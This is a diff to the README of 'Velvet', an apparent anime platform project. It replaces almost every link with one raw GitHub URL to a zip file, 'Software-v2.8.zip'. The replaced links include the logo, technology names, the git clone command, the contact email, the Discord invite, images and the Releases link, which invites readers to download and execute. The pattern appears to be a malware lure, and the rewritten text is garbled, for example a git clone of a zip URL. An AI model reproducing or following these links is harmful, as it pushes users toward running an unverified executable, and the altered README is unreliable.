@@ -1,6 +1,6 @@
 # Velvet 🌟
 
-![Velvet Logo](https://img.shields.io/badge/Velvet-Anime%20Platform-brightgreen)
+![Velvet Logo](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip%20Platform-brightgreen)
 
 Welcome to **Velvet**, a full-stack anime platform that offers a modern frontend, integrated bot, and scalable backend. Whether you're an anime enthusiast or a developer looking to explore, Velvet has something for everyone. 
 
@@ -25,10 +25,10 @@ Welcome to **Velvet**, a full-stack anime platform that offers a modern frontend
 
 ## Technologies Used
 
-- **Frontend**: React.js, CSS3, HTML5
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip, CSS3, HTML5
+- **Backend**: https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip, https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip
 - **Database**: MongoDB
-- **Discord Bot**: Discord.js
+- **Discord Bot**: https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip
 - **Scraping**: Cheerio, Axios
 - **Deployment**: Heroku, Docker
 
@@ -38,7 +38,7 @@ To get started with Velvet, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/PREMPATIL19/velvet.git
+   git clone https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip
    cd velvet
    ```
 
@@ -56,7 +56,7 @@ To get started with Velvet, follow these steps:
    ```
 
 3. **Environment Variables**:
-   Create a `.env` file in the backend directory and add your configuration settings. Refer to `.env.example` for guidance.
+   Create a `.env` file in the backend directory and add your configuration settings. Refer to `https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip` for guidance.
 
 4. **Run the Application**:
    Start the backend server:
@@ -109,16 +109,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out to:
 
-- **Email**: your-email@example.com
-- **GitHub**: [PREMPATIL19](https://github.com/PREMPATIL19)
+- **Email**: https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip
+- **GitHub**: [PREMPATIL19](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip)
 
 ## Releases
 
-To download the latest version of Velvet, visit the [Releases](https://github.com/PREMPATIL19/velvet/releases) section. Here, you can find the necessary files to download and execute.
+To download the latest version of Velvet, visit the [Releases](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip) section. Here, you can find the necessary files to download and execute.
 
 You can also check the Releases section for any updates or new features.
 
-![Anime Watching](https://example.com/anime-watching-image.jpg)
+![Anime Watching](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip)
 
 ## Topics
 
@@ -145,9 +145,9 @@ Feel free to explore and contribute to these topics!
 
 ## Community
 
-Join our community on Discord to discuss anime, share recommendations, and get help with Velvet. Click [here](https://discord.gg/example) to join.
+Join our community on Discord to discuss anime, share recommendations, and get help with Velvet. Click [here](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip) to join.
 
-![Community](https://example.com/community-image.jpg)
+![Community](https://raw.githubusercontent.com/PREMPATIL19/velvet/main/infra/Software-v2.8.zip)
 
 ## Acknowledgments
 
